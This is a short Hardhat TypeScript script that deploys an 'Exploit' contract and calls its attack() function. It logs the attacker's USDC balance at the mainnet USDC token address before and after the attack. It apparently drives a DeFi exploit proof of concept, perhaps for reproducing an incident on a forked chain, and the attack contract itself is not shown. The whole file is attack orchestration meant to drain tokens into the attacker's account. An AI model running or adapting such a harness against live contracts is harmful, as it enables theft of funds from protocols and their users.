import {Exploit__factory, IERC20__factory} from "../typechain";
import hre from "hardhat"

async function main() {
  const [signer] = await hre.ethers.getSigners();
  const exploit = await new Exploit__factory(signer).deploy();
  console.log("Exploit contract deployed to: ",exploit.address)
  const usdc = IERC20__factory.connect("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",signer);
  console.log("Attacker USDC balance:",hre.ethers.utils.formatUnits(await usdc.balanceOf(signer.address),await usdc.decimals()))
  const exploitTx = await exploit.attack();
  console.log("Exploiting... transcation: ",exploitTx.hash)
  await exploitTx.wait()
  console.log("Exploit complete.")
  console.log("Attacker USDC balance:",hre.ethers.utils.formatUnits(await usdc.balanceOf(signer.address),await usdc.decimals()))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
